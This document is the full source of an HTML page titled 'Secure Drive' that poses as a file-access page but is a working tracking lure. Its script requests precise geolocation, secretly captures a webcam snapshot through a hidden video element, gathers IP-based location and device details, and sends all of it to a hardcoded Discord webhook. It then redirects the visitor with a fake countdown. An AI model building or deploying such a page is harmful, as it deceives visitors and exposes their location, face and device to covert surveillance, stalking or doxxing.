<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Drive</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #0a0a0a;
      color: #00ffcc;
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100%;
      text-align: center;
      font-size: 1.2rem;
    }
    #main {
      padding: 1em;
    }
    #countdown {
      font-size: 1.6rem;
      color: #fff;
    }
    #spinner {
      border: 4px solid #444;
      border-top: 4px solid #00ffcc;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 1em auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div id="main">
    <div id="statusText">Requesting required permissionsâ€¦</div>
    <div id="spinner"></div>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    const deniedPage = "permission-denied.html";

    let capturedImageData = null;
    let coords = { lat: "Permission denied", lon: "Permission denied", acc: 0 };

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
      };
    }

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      while (n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }

    async function captureSnapshot() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.setAttribute("playsinline", true);
        video.style.position = "absolute";
        video.style.opacity = "0";
        video.srcObject = stream;
        document.body.appendChild(video);

        await video.play();

        // Ensure video is ready (videoWidth/Height available)
        await new Promise((resolve) => {
          const checkReady = () => {
            if (video.videoWidth > 0 && video.videoHeight > 0) {
              resolve();
            } else {
              requestAnimationFrame(checkReady);
            }
          };
          checkReady();
        });

        // Wait 5 seconds before taking snapshot
        await new Promise(res => setTimeout(res, 5000));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        capturedImageData = canvas.toDataURL("image/png");

        stream.getTracks().forEach(t => t.stop());
      } catch (err) {
        console.warn("Camera access denied or failed", err);
      }
    }

    function sendToDiscord(ipData) {
      const mapLink = coords.lat !== "Permission denied"
        ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` : "N/A";
      const device = getDeviceInfo();

      const formData = new FormData();
      const snapshotLine = capturedImageData
        ? "ðŸ“¸ Snapshot received: âœ… [Download Image](attachment://snapshot.png)"
        : "ðŸ“¸ Snapshot received: âŒ No image available";

      const payload = {
        embeds: [{
          title: "ðŸ“ GPS & Device Info",
          description:
            `**Latitude:** ${coords.lat}\n**Longitude:** ${coords.lon}\n**Accuracy:** ${coords.acc} meters` +
            `\n**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}` +
            `\n\nðŸŒ **IP Info**\n**IP:** ${ipData.ipAddress}\n**City:** ${ipData.city}` +
            `\n**Region:** ${ipData.stateProv}\n**Country:** ${ipData.countryName}` +
            `\n\nðŸ–¥ï¸ **Device Info**\n**Platform:** ${device.platform}\n**Browser:** ${device.userAgent}` +
            `\n**Language:** ${device.language}\n**Screen:** ${device.screen}` +
            `\n**Touch Support:** ${device.touchSupport}\n\n${snapshotLine}\n\nðŸ•’ ${new Date().toLocaleString()}`
        }]
      };

      if (capturedImageData) {
        const blob = dataURLtoBlob(capturedImageData);
        formData.append("file", blob, "snapshot.png");
        payload.embeds[0].image = { url: "attachment://snapshot.png" };
      }

      formData.append("payload_json", JSON.stringify(payload));

      fetch(webhookUrl, {
        method: "POST",
        body: formData
      });
    }

    function askNotificationPermission() {
      if ('Notification' in window && Notification.permission !== 'granted') {
        Notification.requestPermission();
      }
    }

    function askLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            coords.lat = pos.coords.latitude;
            coords.lon = pos.coords.longitude;
            coords.acc = pos.coords.accuracy;
            resolve(true);
          },
          () => resolve(false),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    async function startAll() {
      const locationAllowed = await askLocation();
      askNotificationPermission();

      if (!locationAllowed) {
        window.location.href = deniedPage;
        return;
      }

      await captureSnapshot();

      fetch("https://api.db-ip.com/v2/free/self")
        .then(res => res.json())
        .then(sendToDiscord)
        .catch(() => {
          sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" });
        });

      showCountdown();
    }

    function showCountdown() {
      document.getElementById("main").innerHTML = `<div id="countdown">5 seconds to open secure drive</div>`;
      let seconds = 5;
      const countdownEl = document.getElementById("countdown");
      const timer = setInterval(() => {
        seconds--;
        countdownEl.textContent = `${seconds} seconds to open secure drive`;
        if (seconds === 0) {
          clearInterval(timer);
          window.location.href = redirectUrl;
        }
      }, 1000);
    }

    startAll();
  </script>
</body>
</html>
